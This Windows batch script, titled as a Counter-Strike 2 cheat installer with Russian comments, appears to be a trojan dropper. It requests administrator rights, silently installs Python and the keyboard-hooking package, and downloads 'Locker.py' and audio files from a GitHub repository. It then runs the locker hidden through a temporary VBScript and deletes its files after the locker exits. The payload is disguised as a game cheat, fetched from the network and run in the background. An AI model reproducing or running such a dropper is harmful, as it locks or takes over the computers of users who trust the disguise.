@echo off
setlocal EnableExtensions EnableDelayedExpansion
title CS2 Cheat Installer

rem --- UAC ---
net session >nul 2>&1
if errorlevel 1 (
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

rem --- рабочая папка на C:\ ---
set "WORKDIR=C:\CyberHack"
if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1

set "SCRIPT=%WORKDIR%\cyberhack.py"
set "SOUND=%WORKDIR%\sound.b64"
set "VOICE=%WORKDIR%\voice.b64"
set "BASE=https://raw.githubusercontent.com/xerobrin9908-blip/-/refs/heads/main"

rem --- Python ---
set "PYTHON_EXE="
set "PYTHONW_EXE="
where python >nul 2>&1
if not errorlevel 1 (
    set "PYTHON_EXE=python"
    for %%P in (python.exe) do (
        if exist "%%~$PATH:P" (
            set "PYTHONW_EXE=%%~dp$PATH:Ppythonw.exe"
        )
    )
    goto :python_ok
)

echo [*] Python not found. Downloading...
set "PY_INSTALLER=%TEMP%\python_installer.exe"
set "PY_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe"
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -Uri '%PY_URL%' -OutFile '%PY_INSTALLER%' -UseBasicParsing"
if not exist "%PY_INSTALLER%" ( echo [ERROR] Python download failed. & pause & exit /b 1 )

"%PY_INSTALLER%" /quiet InstallAllUsers=1 PrependPath=1 >nul 2>&1
if errorlevel 1 ( echo [ERROR] Python install failed. & pause & exit /b 1 )

set "PATH=%PATH%;%ProgramFiles%\Python311;%ProgramFiles%\Python311\Scripts"
where python >nul 2>&1
if errorlevel 1 ( echo [ERROR] Python not in PATH. & pause & exit /b 1 )
set "PYTHON_EXE=python"
set "PYTHONW_EXE=%ProgramFiles%\Python311\pythonw.exe"

:python_ok
echo [OK] Python ready.

echo [*] Installing keyboard...
%PYTHON_EXE% -m pip install keyboard >nul 2>&1
if errorlevel 1 ( echo [ERROR] pip install keyboard failed. & pause & exit /b 1 )
echo [OK] keyboard installed.

rem --- Download Locker.py ---
echo [*] Downloading Locker.py...
if exist "%SCRIPT%" del /f /q "%SCRIPT%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -Uri '%BASE%/Locker.py' -OutFile '%SCRIPT%' -UseBasicParsing"
if not exist "%SCRIPT%" ( echo [ERROR] Locker.py not downloaded. & pause & exit /b 1 )
echo [OK] Locker.py downloaded.

rem --- Download sound1.b64 -> sound.b64 ---
echo [*] Downloading sound1.b64...
if exist "%SOUND%" del /f /q "%SOUND%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -Uri '%BASE%/sound1.b64' -OutFile '%SOUND%' -UseBasicParsing"
if not exist "%SOUND%" (
    echo [WARN] sound1.b64 not downloaded. Sound will be off.
) else (
    echo [OK] sound.b64 downloaded.
)

rem --- Download voice.b64 ---
echo [*] Downloading voice.b64...
if exist "%VOICE%" del /f /q "%VOICE%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -Uri '%BASE%/voice.b64' -OutFile '%VOICE%' -UseBasicParsing"
if not exist "%VOICE%" (
    echo [WARN] voice.b64 not downloaded. Voice will be off.
) else (
    echo [OK] voice.b64 downloaded.
)

rem --- запуск в фоне через VBScript ---
echo [*] Launching...
set "VBS=%TEMP%\cyberhack_launch.vbs"
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run """%PYTHONW_EXE%"" ""%SCRIPT%""", 0, False
) > "%VBS%"

cscript //nologo "%VBS%" >nul 2>&1
del /f /q "%VBS%" >nul 2>&1

rem --- ждём, пока локер работает ---
:wait_loop
timeout /t 2 >nul
tasklist /fi "imagename eq pythonw.exe" 2>nul | find /i "pythonw.exe" >nul
if not errorlevel 1 goto :wait_loop

rem --- Cleanup ---
if exist "%SCRIPT%" del /f /q "%SCRIPT%" >nul 2>&1
if exist "%SOUND%"  del /f /q "%SOUND%"  >nul 2>&1
if exist "%VOICE%"  del /f /q "%VOICE%"  >nul 2>&1

exit /b 0
